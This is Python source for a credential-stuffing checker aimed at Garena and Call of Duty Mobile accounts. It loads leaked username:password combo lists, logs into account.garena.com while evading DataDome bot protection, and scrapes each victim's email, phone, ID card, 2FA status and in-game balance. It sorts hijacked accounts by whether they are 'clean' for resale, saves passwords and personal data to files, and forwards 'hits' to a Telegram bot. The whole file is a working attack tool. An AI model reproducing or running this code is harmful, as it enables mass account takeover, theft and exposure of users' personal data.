def save_account_details(account, details, codm_info=None, password=None):
    try:
        # ✅ Only save if CODM info exists
        if not codm_info:
            details['is_valid'] = False  # Prevent saving
            return

        os.makedirs('Results', exist_ok=True)
        
        codm_name = codm_info.get('codm_nickname', 'N/A')
        codm_uid = codm_info.get('uid', 'N/A')
        codm_region = codm_info.get('region', 'N/A')
        codm_level = codm_info.get('codm_level', 'N/A')
        shell_balance = details['profile']['shell_balance']
        country = details['personal']['country']

        # Use the improved bind detection from parse_account_details
        bind_status = "Clean" if details['is_clean'] else "Bound"
        bind_details = details['bind_status']

        # Save CODM-related info separately
        save_codm_account(account, password, codm_info, country)
        
        # Save to appropriate file based on bind status
        filename = f"Results/{bind_status.lower()}_accounts.txt"

        with open(filename, 'a', encoding='utf-8') as f:
            f.write("=" * 60 + "\n")
            f.write(f"Account: {account}\n")
            if password:
                f.write(f"Password: {password}\n")
            f.write(f"UID: {details['uid']}\n")
            f.write(f"Username: {details['username']}\n")
            f.write(f"Nickname: {details['nickname']}\n")
            f.write(f"Email: {details['email']}\n")
            f.write(f"Phone: {details['personal']['mobile_no']}\n")
            f.write(f"Country: {country}\n")
            f.write(f"Shell Balance: {shell_balance}\n")
            f.write(f"Account Status: {details['status']['account_status']}\n")
            f.write(f"Bind Status: {bind_details}\n")
            f.write(f"Security Status: {details['security_status']}\n")
            f.write(f"CODM Name: {codm_name}\n")
            f.write(f"CODM UID: {codm_uid}\n")
            f.write(f"CODM Region: {codm_region}\n")
            f.write(f"CODM Level: {codm_level}\n")
            f.write("=" * 60 + "\n\n")
            
        # Also append to a full combined file
        with open('Results/full_details.txt', 'a', encoding='utf-8') as f_full:
            f_full.write("=" * 60 + "\n")
            f_full.write(f"Account: {account}\n")
            if password:
                f_full.write(f"Password: {password}\n")
            f_full.write(f"UID: {details['uid']}\n")
            f_full.write(f"Username: {details['username']}\n")
            f_full.write(f"Nickname: {details['nickname']}\n")
            f_full.write(f"Email: {details['email']}\n")
            f_full.write(f"Phone: {details['personal']['mobile_no']}\n")
            f_full.write(f"Country: {country}\n")
            f_full.write(f"Shell Balance: {shell_balance}\n")
            f_full.write(f"Account Status: {details['status']['account_status']}\n")
            f_full.write(f"Bind Status: {bind_details}\n")
            f_full.write(f"Security Status: {details['security_status']}\n")
            f_full.write(f"CODM Name: {codm_name}\n")
            f_full.write(f"CODM UID: {codm_uid}\n")
            f_full.write(f"CODM Region: {codm_region}\n")
            f_full.write(f"CODM Level: {codm_level}\n")
            f_full.write("=" * 60 + "\n\n")
            
    except Exception as e:
        logger.error(f"[ERROR] Error saving account details: {e}")

def parse_account_details(data):
    user_info = data.get('user_info', {})

    account_info = {
        'uid': user_info.get('uid', 'N/A'),
        'username': user_info.get('username', 'N/A'),
        'nickname': user_info.get('nickname', 'N/A'),
        'email': user_info.get('email', 'N/A'),
        'email_verified': bool(user_info.get('email_v', 0)),
        'email_verified_time': user_info.get('email_verified_time', 0),
        'email_verify_available': bool(user_info.get('email_verify_available', False)),

        'security': {
            'password_strength': user_info.get('password_s', 'N/A'),
            'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)),
            'authenticator_app': bool(user_info.get('authenticator_enable', 0)),
            'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)),
            'facebook_account': user_info.get('fb_account', None),
            'suspicious': bool(user_info.get('suspicious', False))
        },

        'personal': {
            'real_name': user_info.get('realname', 'N/A'),
            'id_card': user_info.get('idcard', 'N/A'),
            'id_card_length': user_info.get('idcard_length', 'N/A'),
            'country': user_info.get('acc_country', 'N/A'),
            'country_code': user_info.get('country_code', 'N/A'),
            'mobile_no': user_info.get('mobile_no', 'N/A'),
            'mobile_binding_status': "Bound" if user_info.get('mobile_binding_status', 0) and user_info.get('mobile_no', '') else "Not Bound",
            'extra_data': user_info.get('realinfo_extra_data', {})
        },

        'profile': {
            'avatar': user_info.get('avatar', 'N/A'),
            'signature': user_info.get('signature', 'N/A'),
            'shell_balance': user_info.get('shell', 0)
        },

        'status': {
            'account_status': "Active" if user_info.get('status', 0) == 1 else "Inactive",
            'whitelistable': bool(user_info.get('whitelistable', False)),
            'realinfo_updatable': bool(user_info.get('realinfo_updatable', False))
        },

        'binds': [],
        'game_info': []
    }

    email = account_info['email']
    if email != 'N/A' and email and not email.startswith('*') and '@' in email and not email.endswith('@gmail.com') and '**' not in email:
        account_info['binds'].append('Email')

    mobile_no = account_info['personal']['mobile_no']
    if mobile_no != 'N/A' and mobile_no and mobile_no.strip():
        account_info['binds'].append('Phone')

    if account_info['security']['facebook_connected']:
        account_info['binds'].append('Facebook')

    id_card = account_info['personal']['id_card']
    if id_card != 'N/A' and id_card and id_card.strip():
        account_info['binds'].append('ID Card')

    account_info['bind_status'] = "Clean" if not account_info['binds'] else f"Bound ({', '.join(account_info['binds'])})"
    account_info['is_clean'] = len(account_info['binds']) == 0 and not account_info['email_verified']

    security_indicators = []
    if account_info['security']['two_step_verify']:
        security_indicators.append("2FA")
    if account_info['security']['authenticator_app']:
        security_indicators.append("Auth App")
    if account_info['security']['suspicious']:
        security_indicators.append("[WARNING] Suspicious")

    account_info['security_status'] = "[SUCCESS] Normal" if not security_indicators else " | ".join(security_indicators)

    return account_info

def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, TG_SETTINGS=None):
    try:
        datadome_manager.clear_session_datadome(session)

        current_datadome = datadome_manager.get_datadome()
        if current_datadome:
            success = datadome_manager.set_session_datadome(session, current_datadome)
            if not success:
                logger.warning(f"[WARNING] Failed to set existing DataDome cookie")
        else:
            datadome = get_datadome_cookie(session)
            if not datadome:
                logger.warning(f"[WARNING] DataDome generation failed, proceeding without it")
            else:
                datadome_manager.set_datadome(datadome)
                datadome_manager.set_session_datadome(session, datadome)

        v1, v2, new_datadome = prelogin(session, account, datadome_manager)

        if v1 == "IP_BLOCKED":
            live_stats.update_stats(valid=False)
            return f"[ERROR] {account}: IP Blocked - New DataDome required"

        if not v1 or not v2:
            live_stats.update_stats(valid=False)
            return f"[ERROR] {account}: invalid (prelogin failed)"

        if new_datadome:
            datadome_manager.set_datadome(new_datadome)
            datadome_manager.set_session_datadome(session, new_datadome)

        sso_key = login(session, account, password, v1, v2)
        if not sso_key:
            live_stats.update_stats(valid=False)
            return f"[ERROR] {account}: invalid (login failed)"

        headers = {
            'accept': '*/*',
            'referer': 'https://account.garena.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
        }

        current_cookies = session.cookies.get_dict()
        cookie_parts = [f"{k}={v}" for k, v in current_cookies.items() if k in ['apple_state_key', 'datadome', 'sso_key']]
        if cookie_parts:
            headers['cookie'] = '; '.join(cookie_parts)

        response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=30)

        if response.status_code == 403:
            live_stats.update_stats(valid=False)
            return f"[ERROR] {account}: error_security_ban"

        try:
            account_data = response.json()
        except json.JSONDecodeError:
            live_stats.update_stats(valid=False)
            return f"[ERROR] {account}: unknown_error"

        # ✅ Detect and handle all error_* types
        if 'error' in account_data:
            error_type = account_data.get('error', '').lower()
            if any(e in error_type for e in [
                'error_auth', 'error_no_account', 'error_security_ban', 'unknown_error'
            ]):
                live_stats.update_stats(valid=False)
                return f"[ERROR] {account}: {error_type}"
            else:
                live_stats.update_stats(valid=False)
                return f"[ERROR] {account}: unknown_error"

        # ✅ Parse account details (only if valid)
        if 'user_info' in account_data:
            details = parse_account_details(account_data)
        else:
            details = parse_account_details({'user_info': account_data})

        has_codm, codm_info = check_codm_account(session, account)
        fresh_datadome = datadome_manager.extract_datadome_from_session(session)
        if fresh_datadome:
            cookie_manager.save_cookie(fresh_datadome)

        save_account_details(account, details, codm_info if has_codm else None, password)

        # ✅ Update stats
        live_stats.update_stats(valid=True, clean=details['is_clean'], has_codm=has_codm)

        shell_balance = details['profile']['shell_balance']
        bind_status_display = "[CLEAN]" if details['is_clean'] else "[BOUND]"

        # ✅ Always show full info in console
        result = f"[SUCCESS] {account}: Valid\n"
        if has_codm:
            result += display_codm_info(details, codm_info)

        if details['is_clean']:
            logger.info(f"[CLEAN] {account}: Clean account detected")
        else:
            logger.info(f"[BOUND] {account}: Not clean account (has binds)")

        # ───────────────────────────────────────────────
        # 🟩 Telegram Save System (Optional)
        # ───────────────────────────────────────────────
        if TG_SETTINGS and has_codm and codm_info:
            try:
                codm_level = int(codm_info.get('codm_level', 0))
                clean_only = TG_SETTINGS.get('clean_only', False)
                range_str = TG_SETTINGS.get('level_range', 'ALL')

                # Clean-only filter (Skip TG only)
                if clean_only and not details['is_clean']:
                    logger.info(f"[SKIP] {account} (Bound, clean-only mode)")
                    return result  # still shows full info

                # Level range filter (Skip TG only)
                if range_str != "ALL":
                    low, high = map(int, range_str.split('-'))
                    if not (low <= codm_level <= high):
                        logger.info(f"[SKIP] {account} (Level {codm_level} not in {range_str})")
                        return result  # still shows full info

                # ────────── Send Telegram message ──────────
                msg = (
                    f"[+] CODM Hit Found\n"
                    f"[+] Nickname: {codm_info.get('codm_nickname', 'N/A')}\n"
                    f"[+] Level: {codm_info.get('codm_level', 'N/A')}\n"
                    f"[+] Region: {codm_info.get('region', 'N/A')}\n"
                    f"[+] UID: {codm_info.get('uid', 'N/A')}\n"
                    f"[+] Username: {account}\n"
                    f"[+] Email: {details.get('email', 'N/A')}\n"
                    f"[+] Country: {details.get('personal', {}).get('country', 'N/A')}\n"
                    f"[+] Bind Status: {'Clean' if details['is_clean'] else 'Bound'}\n"
                    f"[+] Shell Balance: {details['profile'].get('shell_balance', '0')}\n"
                    f"[+] Security: Suspicious\n"
                    f"[+] Status: Active"
                )

                send_to_telegram(TG_SETTINGS['bot_token'], TG_SETTINGS['chat_id'], msg)
                logger.info(f"[TG] Sent to Telegram: {account} (Level {codm_level})")

            except Exception as e:
                logger.error(f"[TG ERROR] Telegram send failed for {account}: {e}")

        return result

    except Exception as e:
        logger.error(f"[ERROR] Unexpected error processing {account}: {e}")
        live_stats.update_stats(valid=False)
        return f"[ERROR] {account}: processing error"

def find_nearest_account_file():
    keywords = ["garena", "account", "codm"]
    combo_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Combo")

    txt_files = []
    for root, _, files in os.walk(combo_folder):
        for file in files:
            if file.endswith(".txt"):
                txt_files.append(os.path.join(root, file))

    for file_path in txt_files:
        if any(keyword in os.path.basename(file_path).lower() for keyword in keywords):
            return file_path

    if txt_files:
        return random.choice(txt_files)

    return os.path.join(combo_folder, "accounts.txt")

import os
import requests
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.box import DOUBLE

console = Console()

# ───────────────────────────────────────────────
# TELEGRAM SENDER
# ───────────────────────────────────────────────
def send_to_telegram(bot_token, chat_id, message):
    """Send message to Telegram bot with error handling"""
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }

        response = requests.post(url, data=data, timeout=10)

        if response.status_code == 200:
            console.print(f"[green]✅ Telegram Hit Sent Successfully[/green]")
        else:
            console.print(Panel(
                f"⚠️ Telegram Error [{response.status_code}]\n\n{response.text}",
                style="red",
                title="Telegram Send Failed"
            ))

    except requests.exceptions.RequestException as e:
        console.print(Panel(
            f"❌ Network Error while sending to Telegram:\n{e}",
            style="red",
            title="Telegram Connection Error"
        ))


# ───────────────────────────────────────────────
# REMOVE DUPLICATES FUNCTION
# ───────────────────────────────────────────────
def remove_duplicates_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        unique_lines = []
        seen_lines = set()
        for line in lines:
            stripped_line = line.strip()
            if stripped_line and stripped_line not in seen_lines:
                unique_lines.append(line)
                seen_lines.add(stripped_line)

        if len(lines) == len(unique_lines):
            console.print(f"[yellow][*] No duplicate lines found in {os.path.basename(file_path)}.[/yellow]")
            return False

        with open(file_path, 'w', encoding='utf-8') as f:
            f.writelines(unique_lines)

        console.print(f"[green][+] Removed {len(lines) - len(unique_lines)} duplicate lines from {os.path.basename(file_path)}.[/green]")
        return True
    except Exception as e:
        console.print(f"[red][ERROR] Failed to clean {os.path.basename(file_path)}: {e}[/red]")
        return False


import os
import cloudscraper
from rich.console import Console
from rich.panel import Panel
from rich.box import DOUBLE

console = Console()

def select_input_file():
    combo_folder = os.path.join(os.getcwd(), "Combo")
    os.makedirs(combo_folder, exist_ok=True)

    txt_files = [f for f in os.listdir(combo_folder) if f.endswith(".txt")]
    if not txt_files:
        console.print(Panel("No .txt files found in Combo folder!", style="red", title="Error"))
        exit(0)

    # Show available .txt files
    table = "\n".join([f"[cyan]{i+1}.[/cyan] {f}" for i, f in enumerate(txt_files)])
    console.print(Panel(table, title="Available Combo Files ───────────────[FIXED] @findmebro20", style="blue"))

    # Select file
    selected = console.input("\nSelect file number or press Enter for auto-select: ").strip()
    if selected.isdigit() and 1 <= int(selected) <= len(txt_files):
        file_path = os.path.join(combo_folder, txt_files[int(selected)-1])
    else:
        file_path = os.path.join(combo_folder, txt_files[0])
        console.print(Panel(f"Auto-selected: [green]{os.path.basename(file_path)}[/green]", style="green", title="Auto"))

    # Ask for Auto Remove Checked Lines
    auto_remove_choice = console.input("\nAuto Remove Checked Lines (y/N): ").strip().lower()
    AUTO_REMOVE_CHECKED = auto_remove_choice == "y"

    # Ask for Telegram Bot Hits Save
    tg_choice = console.input("\nSave TG Bot Hits (y/N): ").strip().lower()
    TG_SETTINGS = None

    if tg_choice == "y":
        TG_SETTINGS = {}
        TG_SETTINGS["bot_token"] = console.input("Enter BOT_TOKEN: ").strip()
        TG_SETTINGS["chat_id"] = console.input("Enter CHAT_ID: ").strip()

        clean_choice = console.input("Clean or NotClean [c/n]: ").strip().lower()
        TG_SETTINGS["clean_only"] = (clean_choice == "c")

        console.print("\nSelect Level Range to Send Hits:")
        console.print("[1] 1-50\n[2] 50-100\n[3] 100-200\n[4] 200-300\n[5] 300-400\n[6] ALL LEVELS")

        range_choice = console.input("Enter Number: ").strip()
        ranges = {
            "1": "1-50",
            "2": "50-100",
            "3": "100-200",
            "4": "200-300",
            "5": "300-400",
            "6": "ALL"
        }
        TG_SETTINGS["level_range"] = ranges.get(range_choice, "ALL")

        console.print(Panel(
            f"✅ Telegram Save Enabled\n"
            f"Bot Token: [cyan]{TG_SETTINGS['bot_token']}[/cyan]\n"
            f"Chat ID: [cyan]{TG_SETTINGS['chat_id']}[/cyan]\n"
            f"Clean Only: {'Yes' if TG_SETTINGS['clean_only'] else 'No'}\n"
            f"Level Range: {TG_SETTINGS['level_range']}",
            style="green",
            title="Telegram Save Setup ───────────────[FIXED] @findmebro20"
        ))

    return file_path, AUTO_REMOVE_CHECKED, TG_SETTINGS


def main():
    # 🟡 Select input file + Telegram + Auto Remove feature
    filename, AUTO_REMOVE_CHECKED, TG_SETTINGS = select_input_file()

    if not os.path.exists(filename):
        console.print(Panel(f"File not found: {filename}", style="red", title="Error"))
        return

    cookie_manager = CookieManager()
    datadome_manager = DataDomeManager()
    live_stats = LiveStats()
    session = cloudscraper.create_scraper()

    # Cookie initialization panel
    cookies = cookie_manager.get_valid_cookies()
    initial_cookie = cookies[0] if cookies else None
    if initial_cookie:
        console.print(Panel("Using saved cookie", style="green", title="Session"))
        applyck(session, initial_cookie)
    else:
        console.print(Panel("Starting fresh session", style="yellow", title="Session"))
        datadome = get_datadome_cookie(session)
        if datadome:
            datadome_manager.set_datadome(datadome)
            console.print(Panel("Generated DataDome cookie", style="green", title="Security"))

    # Load accounts safely
    try:
        with open(filename, "r", encoding="utf-8", errors="ignore") as f:
            accounts = [line.strip() for line in f if line.strip()]
    except Exception as e:
        console.print(Panel(f"Error reading file: {e}", style="red", title="File Error"))
        return

    total_accounts = len(accounts)
    console.print(Panel(
        f"Loaded [cyan]{total_accounts:,}[/cyan] accounts\nProcessing started...",
        style="bold blue",
        title="Processing Started ───────────────[FIXED] @findmebro20"
    ))

    # Process each account
    for i, account_line in enumerate(accounts, 1):
        if ":" not in account_line:
            logger.warning(f"[SKIP] Invalid format: {account_line}")
            continue

        # ✅ Support both user:pass and url:user:pass
        parts = account_line.split(":")
        if len(parts) == 2:
            account, password = parts
        elif len(parts) == 3:
            # Handles url:user:pass
            _, account, password = parts
        else:
            logger.warning(f"[SKIP] Invalid line format: {account_line}")
            continue

        account, password = account.strip(), password.strip()

        try:
            # Process account with Telegram save support
            result = processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, TG_SETTINGS)
            console.print(result)

            # 🟩 Live progress bar
            bar_length = 40
            progress = i / total_accounts
            filled = int(bar_length * progress)
            empty = bar_length - filled
            bar = f"[green]{'█' * filled}[/green][white]{'░' * empty}[/white]"
            percent = f"{progress * 100:5.1f}%"

            # 🧮 Display stats
            stats = live_stats.get_stats()
            live_panel = Panel(
                f"{bar} {percent}\n"
                f"Valid: [green]{stats['valid']}[/green] | "
                f"Invalid: [red]{stats['invalid']}[/red] | "
                f"Clean: [blue]{stats['clean']}[/blue] | "
                f"Not Clean: [yellow]{stats['not_clean']}[/yellow] | "
                f"CODM: [cyan]{stats['has_codm']}[/cyan]",
                style="cyan",
                title="Live Statistics"
            )
            console.print(live_panel)

            # 🧹 Auto remove checked line if enabled
            if AUTO_REMOVE_CHECKED:
                try:
                    with open(filename, "r", encoding="utf-8", errors="ignore") as f:
                        remain = [ln for ln in f if ln.strip() != account_line.strip()]
                    with open(filename, "w", encoding="utf-8") as f:
                        for r in remain:
                            f.write(r if r.endswith("\n") else r + "\n")
                except Exception as e:
                    logger.error(f"Auto-remove failed: {e}")

        except Exception as e:
            console.print(f"[red][ERROR][/red] Failed to process {account}: {e}")
            continue

    # 🏁 Final summary
    final_stats = live_stats.get_stats()
    console.print(Panel(
        f"Valid: [green]{final_stats['valid']}[/green]\n"
        f"Invalid: [red]{final_stats['invalid']}[/red]\n"
        f"Clean: [blue]{final_stats['clean']}[/blue]\n"
        f"Not Clean: [yellow]{final_stats['not_clean']}[/yellow]\n"
        f"Has CODM: [cyan]{final_stats['has_codm']}[/cyan]\n"
        f"No CODM: [magenta]{final_stats['no_codm']}[/magenta]",
        style="bold green",
        title="Final Results ───────────────[FIXED] @findmebro20",
        box=DOUBLE
    ))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Script terminated by user.")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")